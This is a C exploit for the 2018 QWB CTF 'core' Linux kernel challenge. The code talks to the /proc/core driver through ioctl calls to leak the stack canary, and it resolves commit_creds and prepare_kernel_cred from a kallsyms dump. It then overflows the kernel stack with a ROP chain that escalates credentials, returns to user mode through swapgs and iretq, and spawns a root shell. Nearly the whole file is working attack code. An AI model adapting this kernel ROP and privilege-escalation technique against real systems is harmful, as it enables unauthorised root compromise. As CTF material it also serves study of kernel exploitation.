#include <stdio.h>
#include <stdlib.h>


int fd = 0;
void copy_to_user(char *buf) {
    puts("[+] kernel: copy to usr");
    ioctl(fd, 0x6677889B, buf);
}

void setoff(size_t n) {
    puts("[+] kernel: setting off");
    ioctl(fd, 0x6677889C, n);
}

void copy(size_t n) {
    puts("[+] kernel: copy bss to stack");
    n=0xffffffffffff0000|n;
    ioctl(fd, 0x6677889A, n);
}

size_t commit_creds=0;
size_t prepare_kernel_cred=0;
size_t vmlinux_base=0;
void find_symbol(){
    /*
        >>> from pwn import *
        >>> e=ELF('./vmlinux')
        [*] '/home/byzero/Desktop/2018-qwb-core/vmlinux'
            Arch:     amd64-64-little
            RELRO:    No RELRO
            Stack:    Canary found
            NX:       NX disabled
            PIE:      No PIE (0xffffffff81000000)
            RWX:      Has RWX segments
        >>> hex(e.symbols['commit_creds']-0xffffffff81000000)
        '0x9c8e0'
        >>> hex(e.symbols['prepare_kernel_cred']-0xffffffff81000000)
        '0x9cce0'
    */
    FILE *kfd = fopen("/tmp/kallsyms", "r");
    if(kfd<0){
        puts("open kallsysm failed");
        exit(-1);
    }
    char buf[0x30]={0};
    while(fgets(buf,0x30,kfd)){
        if(commit_creds && prepare_kernel_cred){
            printf("commit_creds: %p\n",commit_creds);
            printf("prepare_kernel_cred: %p\n",prepare_kernel_cred);
            vmlinux_base = commit_creds - 0x9c8e0; 
            printf("vmlinux_base: %p\n",vmlinux_base);
            return;
        }
        if(strstr(buf,"commit_creds")&&!commit_creds){
            char hex[0x20]={0};
            strncpy(hex,buf,16);
            sscanf(hex,"%llx",&commit_creds);
        }
        if (strstr(buf, "prepare_kernel_cred")&&!prepare_kernel_cred) {
            char hex[0x20]={0};
            strncpy(hex, buf, 16);
            sscanf(hex, "%llx", &prepare_kernel_cred);
        }
    }
}
size_t addr(size_t a) { return a - 0xffffffff81000000+vmlinux_base; }
size_t getCanary(){
    setoff(0x40);
    char buf[0x40]={0};
    copy_to_user(buf);
    size_t canary=((size_t*)buf)[0];
    printf("canary: %p\n",canary);
    return canary;
}
size_t ucs,uss,ueflags,usp;
void save_status(){
    __asm__(
        "mov ucs,cs;"
        "mov uss,ss;"
        "mov usp,rsp;"
        "pushf;"
        "pop ueflags;"
    );
    puts("save");
}


void shell(){
    printf("getshell\n");
    system("/bin/sh");
}

int main(){
    find_symbol();
    save_status();
    fd=open("/proc/core",2);
    if(fd<0){
        puts("open core error");
        exit(-1);
    }
    size_t canary=getCanary();
    setbuf(stdin,0);
    setbuf(stdout,0);
    setbuf(stderr,0);
    size_t rop[0x1000]={0};
    int i;
    for(i=0;i<8;i++){
        rop[i]=-1;
    }
    rop[i++]=canary;
    rop[i++]=-1;           // rbx
    rop[i++] = addr(0xffffffff81000b2f);  // pop rdi;ret
    rop[i++]= 0;
    rop[i++]= prepare_kernel_cred;
    rop[i++] = addr(0xFFFFFFFF81356176);        // pop rdx; ret
    rop[i++] = addr(0xFFFFFFFF8105D0C4);        // pop rbx; ret
    rop[i++] = addr(0xFFFFFFFF81631794);  // mov rdi, rax; call rdx;
    rop[i++] = commit_creds;              // 0xffffffff8109c8e0
    rop[i++] = addr(0xffffffff81a012da);  // swapgs; popfq; ret
    rop[i++]= 0;
    rop[i++] = addr(0xFFFFFFFF81050AC2);     // iretq;
    rop[i++]=(size_t)shell;
    rop[i++]=ucs;
    rop[i++]=ueflags;
    rop[i++]=usp;
    rop[i++]=uss;
    puts("writeing");
    write(fd, (char *)rop, 8 * i);
    copy(8*i);
    return 0;
}
